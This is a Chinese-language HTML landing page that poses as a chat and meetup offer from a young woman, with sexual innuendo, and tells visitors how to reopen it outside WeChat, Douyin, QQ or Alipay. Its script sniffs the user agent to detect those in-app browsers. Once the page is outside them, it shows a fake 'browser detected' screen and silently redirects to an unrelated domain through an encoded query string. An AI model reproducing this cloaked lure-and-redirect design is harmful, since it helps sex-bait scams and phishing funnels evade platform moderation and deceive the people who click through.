<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>小雅在线，点击进入依依或复制链接浏览器打开可以一对一</title>
    <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💋</text></svg>">
    
    <style type="text/css">
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
            color: #333;
            font-size: 16px;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .special-text {
            font-family: "Times New Roman", serif;
            letter-spacing: 1px;
            font-style: italic;
            color: #e74c3c;
            font-weight: bold;
        }

        /* 顶部挑逗区域 - 占据屏幕上1/3 */
        .flirt-section {
            height: 33vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
        }

        .avatar {
            width: 70px;
            height: 70px;
            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            margin-bottom: 15px;
            box-shadow: 0 8px 20px rgba(255, 107, 107, 0.4);
        }

        .name-status {
            color: white;
            margin-bottom: 20px;
        }

        .name {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .status {
            font-size: 14px;
            opacity: 0.9;
        }

        .flirt-message {
            background: rgba(255, 255, 255, 0.95);
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
            max-width: 320px;
            width: 90%;
        }

        .flirt-text {
            font-size: 16px;
            line-height: 1.5;
            color: #333;
            margin-bottom: 10px;
        }

        .highlight-text {
            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
            color: white;
            padding: 10px 15px;
            border-radius: 10px;
            font-weight: bold;
            margin-top: 10px;
            font-size: 15px;
        }

        /* 操作指南区域 - 占据屏幕下2/3 */
        .guide-section {
            min-height: 67vh;
            background: white;
            border-radius: 25px 25px 0 0;
            padding: 30px 20px 40px;
            margin-top: -10px;
            box-shadow: 0 -5px 20px rgba(0,0,0,0.1);
        }

        .guide-title {
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            color: #333;
            margin-bottom: 25px;
        }

        /* 步骤卡片 - 简化设计 */
        .step-item {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 18px;
            margin-bottom: 15px;
            border-left: 4px solid #007bff;
            display: flex;
            align-items: flex-start;
        }

        .step-number {
            background: linear-gradient(45deg, #007bff, #0056b3);
            color: white;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            margin-right: 12px;
            flex-shrink: 0;
        }

        .step-content {
            flex: 1;
        }

        .step-title {
            font-size: 16px;
            font-weight: bold;
            color: #333;
            margin-bottom: 8px;
        }

        .step-desc {
            font-size: 14px;
            color: #666;
            line-height: 1.4;
        }

        .step-visual {
            font-size: 20px;
            margin: 8px 0;
        }

        .step-options {
            background: #e3f2fd;
            padding: 10px;
            border-radius: 8px;
            margin-top: 8px;
            font-size: 13px;
            color: #1565c0;
        }

        /* 底部提示 */
        .bottom-tip {
            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
            color: white;
            padding: 15px;
            border-radius: 12px;
            text-align: center;
            margin-top: 20px;
            font-size: 15px;
            font-weight: bold;
        }

        .safety-note {
            text-align: center;
            color: #999;
            font-size: 12px;
            margin-top: 15px;
            line-height: 1.3;
        }

        /* 响应式优化 */
        @media (max-width: 375px) {
            .flirt-section {
                padding: 15px;
            }
            
            .guide-section {
                padding: 25px 15px 30px;
            }
            
            .flirt-message {
                padding: 18px;
            }
            
            .step-item {
                padding: 15px;
            }
        }

        @media (max-height: 667px) {
            .flirt-section {
                height: 30vh;
            }
            
            .guide-section {
                min-height: 70vh;
            }
        }
    </style>
</head>
<body>
    <!-- 隐藏的预览图 -->
    <img src="./333.png" alt="预览图" style="display: none; position: absolute; left: -9999px; width: 1px; height: 1px;">
    
    <!-- 顶部挑逗区域 -->
    <div class="flirt-section">
        <div class="avatar">👩‍🦰</div>
        <div class="name-status">
            <div class="name">小雅</div>
            <div class="status">23岁 • 在线中 • 等你来撩</div>
        </div>
        
        <div class="flirt-message">
            <div class="flirt-text">
                嗨～帅哥 💕<br>
                想和我<span class="special-text">深入聊聊</span>吗？
            </div>
            <div class="highlight-text">
                只进入身体，不进入生活<br>
                我们可以<span class="special-text">私密见面</span>哦～
            </div>
        </div>
    </div>

    <!-- 操作指南区域 -->
    <div class="guide-section">
        <div class="guide-title">💡 解锁完整聊天功能</div>
        
        <!-- 第一步 -->
        <div class="step-item">
            <div class="step-number">1</div>
            <div class="step-content">
                <div class="step-title">点击右上角三个点</div>
                <div class="step-visual">📱 ➡️ ⋯</div>
                <div class="step-desc">
                    找到屏幕右上角的  <strong>"···"</strong> 按钮并点击
                </div>
            </div>
        </div>

        <!-- 第二步 -->
        <div class="step-item">
            <div class="step-number">2</div>
            <div class="step-content">
                <div class="step-title">选择浏览器打开</div>
                <div class="step-visual">🌐 ✅</div>
                <div class="step-desc">在弹出菜单中选择：</div>
                <div class="step-options">
                    • "在浏览器中打开"<br>
                    • "用浏览器打开"<br>
                    • "在Safari中打开"
                </div>
            </div>
        </div>

        <!-- 第三步 -->
        <div class="step-item">
            <div class="step-number">3</div>
            <div class="step-content">
                <div class="step-title">开始私密聊天</div>
                <div class="step-visual">💬 🔥</div>
                <div class="step-desc">
                    浏览器打开后，即可享受完整的<span class="special-text">深度聊天</span>功能
                </div>
            </div>
        </div>

        <!-- 底部提示 -->
        <div class="bottom-tip">
            🔥 想要更多刺激？按上面步骤操作～
        </div>

        <div class="safety-note">
            🔒 浏览器环境更安全 • 仅限年龄25+人使用
        </div>
    </div>

    <script>
        // 防止页面被嵌入iframe
        if (window.top !== window.self) {
            window.top.location = window.self.location;
        }
        
        // 检测浏览器类型，如果已经在浏览器中则自动跳转
        function checkBrowserAndRedirect() {
            var ua = navigator.userAgent.toLowerCase();
            var isInApp = ua.indexOf('micromessenger') !== -1 ||
                         ua.indexOf('aweme') !== -1 ||
                         ua.indexOf('bytedancewebview') !== -1 ||
                         ua.indexOf('ttwebview') !== -1 ||
                         ua.indexOf('mqq') !== -1 ||
                         ua.indexOf('mqqbrowser') !== -1 ||
                         ua.indexOf('alipay') !== -1;
            
            // 如果不在应用内（即在浏览器中），则自动跳转
            if (!isInApp) {
                var targetUrl = "http://qtjtec.com/template/default/images/index/temp/top.html?d=DxsAHxlTTkIOAkVBCxpPDgMBWgICBwQfSQwaQAVcEwADFkZAWTEMHA0pABsJRlBaUl9FWlpRUVxSW0ZBAh0MAQ%3D%3D";
                
                // 显示跳转提示
                document.body.innerHTML = `
                    <div style="background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;">
                        <div style="background: white; border-radius: 20px; padding: 40px 30px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.2); max-width: 300px;">
                            <div style="font-size: 50px; margin-bottom: 20px;">✅</div>
                            <h2 style="color: #2ecc71; margin-bottom: 15px; font-size: 18px;">检测到浏览器环境</h2>
                            <p style="color: #666; margin-bottom: 25px; font-size: 14px;">正在为您跳转到聊天页面...</p>
                            <div style="width: 35px; height: 35px; border: 3px solid #f3f3f3; border-top: 3px solid #2ecc71; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
                        </div>
                        <style>
                            @keyframes spin {
                                0% { transform: rotate(0deg); }
                                100% { transform: rotate(360deg); }
                            }
                        </style>
                    </div>
                `;
                
                setTimeout(function() {
                    window.location.href = targetUrl;
                }, 2000);
            }
        }
        
        // 页面加载后检测
        document.addEventListener('DOMContentLoaded', checkBrowserAndRedirect);
    </script>
</body>
</html>
